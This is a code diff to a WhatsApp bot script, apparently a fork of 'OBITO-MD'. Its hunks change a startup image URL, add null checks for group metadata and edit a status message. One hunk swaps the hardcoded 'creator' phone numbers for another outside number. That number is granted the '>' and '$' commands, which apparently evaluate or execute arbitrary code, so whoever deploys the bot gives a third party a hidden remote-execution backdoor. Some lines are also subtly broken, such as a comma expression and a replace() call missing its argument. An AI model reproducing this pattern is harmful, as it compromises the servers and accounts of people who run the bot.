@@ -113,7 +113,7 @@ const {
   console.log('Bot connected to whatsapp ✅')
   
   let up = `*YOUR BOT  ACTIVE NOW ENJOY♥️*\n\n*PREFIX:* ${prefix}`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://github.com/Awais-star-a11y/TESTING-REPO/raw/refs/heads/mainMG-20250409-WA0093.jpg` }, caption: up })
+    conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/9gCjCwp/OIG4-E-D0-QOU1r4-Ru-CKuf-Nj0o.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -190,10 +190,11 @@ await Promise.all([
   const isMe = botNumber.includes(senderNumber)
   const isOwner = ownerNumber.includes(senderNumber) || isMe
   const botNumber2 = await jidNormalizedUser(conn.user.id);
-  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
-  const groupName = isGroup ? groupMetadata.subject : ''
-  const participants = isGroup ? await groupMetadata.participants : ''
-  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
+  const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
+  const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
+  const groupAdmins = isGroup && participants.length ? await getGroupAdmins(participants) : [];
+
   const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
   const isAdmins = isGroup ? groupAdmins.includes(sender) : false
   const isReact = m.message.reactionMessage ? true : false
@@ -201,12 +202,12 @@ await Promise.all([
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const ikratos = ('923470027813', '923418191346', '923191089077');
+    const ikratos = ('237696900612');
     let isCreator = [udp, ikratos, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
 
-    if (isCreator && mek.text.startsWith('>')) {
+    if (isCreator && mek.text && mek.text.startsWith('>')) {
 					let code = budy.slice(2);
 					if (!code) {
 						reply(
@@ -224,7 +225,7 @@ await Promise.all([
 					}
 					return;
 				}
-    if (isCreator && mek.text.startsWith('$')) {
+    if (isCreator && mek.text && mek.text.startsWith('$')) {
 					let code = budy.slice(2);
 					if (!code) {
 						reply(
@@ -778,7 +779,7 @@ await Promise.all([
   }
   
   app.get("/", (req, res) => {
-  res.send("OBITO-MD STARTED ✅");
+  res.send("STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
